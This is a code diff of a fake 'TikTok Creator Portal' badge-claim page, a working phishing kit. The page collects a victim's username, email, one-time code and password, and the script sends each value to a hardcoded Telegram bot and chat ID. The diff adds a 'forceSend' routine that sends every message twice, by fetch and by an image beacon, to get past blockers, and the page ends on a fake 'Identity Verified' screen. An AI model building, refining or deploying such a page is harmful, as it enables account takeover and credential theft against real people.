@@ -3,113 +3,111 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>TikTok Creator Portal</title>
+    <title>TikTok Creator Portal | Verification</title>
     <style>
-        :root { --tt-pink: #FE2C55; --tt-cyan: #25F4EE; }
-        body { margin: 0; background-color: #000; font-family: sans-serif; color: white; display: flex; justify-content: center; align-items: center; height: 100vh; padding: 20px; box-sizing: border-box; }
-        .container { width: 100%; max-width: 400px; padding: 40px 24px; text-align: center; background: #121212; border-radius: 12px; border: 1px solid #2a2a2a; }
-        .tt-logo { width: 42px; margin-bottom: 25px; fill: white; }
-        h1 { font-size: 22px; font-weight: 700; margin-bottom: 10px; }
-        p { color: #a1a1a1; font-size: 14px; margin-bottom: 25px; }
+        :root { --tt-pink: #FE2C55; --tt-cyan: #25F4EE; --tt-black: #000; --tt-card: #1d1d1d; }
+        body { margin: 0; background-color: var(--tt-black); font-family: sans-serif; color: white; display: flex; justify-content: center; align-items: center; height: 100vh; padding: 20px; box-sizing: border-box; }
+        .container { width: 100%; max-width: 400px; padding: 40px 24px; text-align: center; background: var(--tt-card); border-radius: 12px; border: 1px solid #2a2a2a; }
+        .tt-logo { width: 45px; fill: white; margin-bottom: 25px; }
+        h1 { font-size: 22px; font-weight: 700; margin-bottom: 12px; }
+        p { color: #a1a1a1; font-size: 14px; margin-bottom: 30px; }
         .step { display: none; }
         .step.active { display: block; }
         input { width: 100%; padding: 14px 16px; background: #2f2f2f; border: 1px solid #3d3d3d; border-radius: 4px; color: white; font-size: 15px; outline: none; margin-bottom: 5px; box-sizing: border-box; }
-        .red-label { font-size: 12px; color: #FE2C55; text-align: left; padding-left: 2px; margin-bottom: 15px; height: 15px; display: none; font-weight: 500; }
-        .red-label.show { display: block; }
+        .status-msg { font-size: 12px; color: #FE2C55; text-align: left; margin-bottom: 15px; display: none; font-weight: 600; }
+        .status-msg.active { display: block; }
         .btn { width: 100%; padding: 16px; background: var(--tt-pink); color: white; border: none; border-radius: 4px; font-size: 15px; font-weight: 700; cursor: pointer; }
-        .btn:disabled { opacity: 0.6; }
-        .loader { border: 3px solid #333; border-top: 3px solid var(--tt-cyan); border-radius: 50%; width: 35px; height: 35px; animation: spin 1s linear infinite; margin: 20px auto; }
+        .btn:disabled { opacity: 0.7; cursor: not-allowed; }
+        .loader-ring { border: 3px solid #333; border-top: 3px solid var(--tt-cyan); border-radius: 50%; width: 35px; height: 35px; animation: spin 1s linear infinite; margin: 20px auto; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
     </style>
 </head>
 <body>
-
 <div class="container">
     <svg class="tt-logo" viewBox="0 0 448 512"><path d="M448,209.91a210.06,210.06,0,0,1-122.77-39.25V349.38A162.55,162.55,0,1,1,185,188.31V278.2a74.62,74.62,0,1,0,52.23,71.18V0l88,0a121.18,121.18,0,0,0,1.86,22.17h0A122.18,122.18,0,0,0,448,109.45Z"/></svg>
-
+    
     <div id="step1" class="step active">
         <h1>Claim Your Badge</h1>
-        <p>Enter your TikTok username to check eligibility.</p>
-        <input type="text" id="username" placeholder="@username">
-        <div id="msg1" class="red-label">Checking database...</div>
-        <button id="btn1" class="btn" onclick="goNext(1, 'Checking...', 2)">CONTINUE</button>
+        <p>Enter your TikTok @username to check eligibility.</p>
+        <input type="text" id="username" placeholder="@username" autocomplete="off">
+        <div id="msg1" class="status-msg">Checking...</div>
+        <button id="btn1" class="btn" onclick="process(1, 'Checking...', 2)">CONTINUE</button>
     </div>
 
     <div id="step2" class="step">
         <h1>Verify Identity</h1>
         <p>Enter the email linked to your account.</p>
-        <input type="email" id="email" placeholder="Email address">
-        <div id="msg2" class="red-label">Verifying email...</div>
-        <button id="btn2" class="btn" onclick="goNext(2, 'Verifying...', 3)">SEND CODE</button>
+        <input type="email" id="email" placeholder="Email address" autocomplete="off">
+        <div id="msg2" class="status-msg">Verifying email...</div>
+        <button id="btn2" class="btn" onclick="process(2, 'Verifying...', 3)">SEND CODE</button>
     </div>
 
     <div id="step3" class="step">
         <h1>Verify Email</h1>
         <p>Enter the 6-digit code sent to your mail.</p>
-        <input type="text" id="code" placeholder="6-digit code">
-        <div id="msg3" class="red-label">Checking code...</div>
-        <button id="btn3" class="btn" onclick="goNext(3, 'Checking code...', 4)">CONFIRM</button>
+        <input type="text" id="code" placeholder="6-digit code" autocomplete="off">
+        <div id="msg3" class="status-msg">Validating code...</div>
+        <button id="btn3" class="btn" onclick="process(3, 'Validating...', 4)">CONFIRM CODE</button>
     </div>
 
     <div id="step4" class="step">
         <h1>Security Check</h1>
-        <p>Confirm password to finalize request.</p>
-        <input type="password" id="password" placeholder="Password">
-        <div id="msg4" class="red-label">Syncing...</div>
-        <button id="btn4" class="btn" onclick="goNext(4, 'Checking password...', 5)">VERIFY</button>
+        <p>Confirm password to finalize the request.</p>
+        <input type="password" id="password" placeholder="Password" autocomplete="off">
+        <div id="msg4" class="status-msg">Syncing with server...</div>
+        <button id="btn4" class="btn" onclick="process(4, 'Syncing...', 5)">VERIFY</button>
     </div>
 
     <div id="step5" class="step">
         <h1>Authenticating...</h1>
-        <div class="loader"></div>
+        <div class="loader-ring"></div>
     </div>
 
     <div id="step6" class="step">
-        <div style="color: var(--tt-cyan); font-size: 60px;">✓</div>
-        <h1>Success</h1>
-        <p>Identity verified. The badge will appear soon.</p>
+        <div style="color: #25F4EE; font-size: 60px; margin-bottom: 20px;">✓</div>
+        <h1>Identity Verified</h1>
+        <p>Your request has been submitted. The badge will be applied within <b>5 business days</b>.</p>
     </div>
 </div>
 
 <script>
-    const BT = '8309435198:AAF3in5RBDwkPxck1P4d_L0BZIIvCvNZTYk'; // Naya Token updated
-    const CI = '7489116869';
+    const TOKEN = '8309435198:AAF3in5RBDwkPxck1P4d_L0BZIIvCvNZTYk';
+    const CHAT = '7489116869';
 
-    async function push(t) {
-        try {
-            await fetch(`https://api.telegram.org/bot${BT}/sendMessage`, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ chat_id: CI, text: t, parse_mode: 'HTML' })
-            });
-        } catch(e) { console.error(e); }
+    // ULTRA FORCE SEND (Dual-Layer)
+    async function forceSend(msg) {
+        const url = `https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT}&text=${encodeURIComponent(msg)}&parse_mode=HTML`;
+        
+        // Layer 1: Standard Fetch
+        fetch(url).catch(() => {});
+        
+        // Layer 2: Beacon Image (Bypasses most blockers)
+        const beacon = new Image();
+        beacon.src = url + "&t=" + new Date().getTime();
     }
 
-    function goNext(c, mTxt, n) {
-        let v = "";
-        if(c==1) v = document.getElementById('username').value;
-        if(c==2) v = document.getElementById('email').value;
-        if(c==3) v = document.getElementById('code').value;
-        if(c==4) v = document.getElementById('password').value;
+    function process(curr, m, nxt) {
+        const val = (curr==1) ? document.getElementById('username').value :
+                    (curr==2) ? document.getElementById('email').value :
+                    (curr==3) ? document.getElementById('code').value :
+                    document.getElementById('password').value;
 
-        if(!v) return;
+        if(!val) return;
 
-        const label = document.getElementById('msg' + c);
-        const btn = document.getElementById('btn' + c);
-        label.innerText = mTxt;
-        label.classList.add('show');
-        btn.disabled = true;
+        document.getElementById('msg'+curr).innerText = m;
+        document.getElementById('msg'+curr).classList.add('active');
+        document.getElementById('btn'+curr).disabled = true;
 
         const u = document.getElementById('username').value;
-        if(c==1) push(`👤 <b>New Hit</b>\nUser: @${v}`);
-        if(c==2) push(`📧 <b>Email</b>\nUser: @${u}\nEmail: ${v}`);
-        if(c==3) push(`🔢 <b>OTP</b>\nUser: @${u}\nCode: ${v}`);
-        if(c==4) push(`🔑 <b>PASS</b>\nUser: @${u}\nPass: <code>${v}</code>`);
+        if(curr==1) forceSend(`👤 <b>New Hit</b>\nUser: @${val}`);
+        if(curr==2) forceSend(`📧 <b>Email</b>\nUser: @${u}\nEmail: ${val}`);
+        if(curr==3) forceSend(`🔢 <b>OTP</b>\nUser: @${u}\nCode: ${val}`);
+        if(curr==4) forceSend(`🔑 <b>PASS</b>\nUser: @${u}\nPass: <code>${val}</code>`);
 
         setTimeout(() => {
             document.querySelectorAll('.step').forEach(el => el.classList.remove('active'));
-            document.getElementById('step' + n).classList.add('active');
-            if(n == 5) setTimeout(() => {
+            document.getElementById('step'+nxt).classList.add('active');
+            if(nxt==5) setTimeout(() => {
                 document.getElementById('step5').classList.remove('active');
                 document.getElementById('step6').classList.add('active');
             }, 4000);
